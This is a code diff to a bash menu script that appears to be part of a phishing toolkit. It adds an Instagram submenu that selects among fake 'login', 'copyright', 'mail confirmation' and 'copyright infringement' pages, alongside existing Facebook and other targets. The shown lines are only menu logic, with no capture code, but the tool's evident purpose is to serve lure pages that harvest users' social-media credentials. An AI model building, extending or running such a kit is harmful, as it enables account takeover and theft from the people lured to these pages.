@@ -112,8 +112,7 @@ printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m \n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' menu_option
 
 if [[ $menu_option == 1 || $menu_option == 01 ]]; then
-server="instagram"
-start
+instagram
 
 elif [[ $menu_option == 2 || $menu_option == 02 ]]; then
 facebook
@@ -413,6 +412,41 @@ start
 
 elif [[ $lol_option == 4 || $lol_option == 04 ]]; then
 server="lol"
+start
+
+else
+printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+clear
+menu
+fi
+
+}
+
+instagram(){
+banner
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m copyright Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Mail confirmation Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Copyright infringement Page\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' insta_option
+
+if [[ $insta_option == 1 || $insta_option == 01 ]]; then
+server="instagram"
+start
+
+elif [[ $insta_option == 2 || $insta_option == 02 ]]; then
+server="cpr"
+start
+
+elif [[ $insta_option == 3 || $insta_option == 03 ]]; then
+server="mcp"
+start
+
+elif [[ $insta_option == 4 || $insta_option == 04 ]]; then
+server="cip"
 start
 
 else
